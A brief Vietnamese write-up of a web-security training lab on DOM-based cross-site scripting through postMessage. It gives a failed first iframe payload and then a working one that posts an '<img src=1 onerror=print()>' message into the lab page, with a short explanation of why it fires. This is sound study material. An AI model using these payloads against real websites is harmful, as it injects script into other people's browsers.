![image](https://github.com/user-attachments/assets/5e4f30a0-31c0-482d-91a2-f8e8939ad0bd)

Mục tiêu: khai thác tin nhắn, gọi hàm print()

Lỗ hổng: tanint flow

Mở lab và đi đến phần exploit server

Ở đây theo như lí thuyết sẽ có 1 payload như sau:

      <iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">

Nên cũng sẽ thử dùng payload này cho phần body

![image](https://github.com/user-attachments/assets/dd3723af-cfbb-4c2d-afb3-4a732f0168e7)

Có vẻ không ổn nên thử tham khảo 

         <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">

Thì ở đây sẽ kích hoạt payload xss với img src=1 là không hợp lệ, từ đó tạo ra lỗi cho print và ép nó phải kích hoạt onerror

![image](https://github.com/user-attachments/assets/4d12bd2b-3ca4-4db7-ba4a-765d4f1a423b)
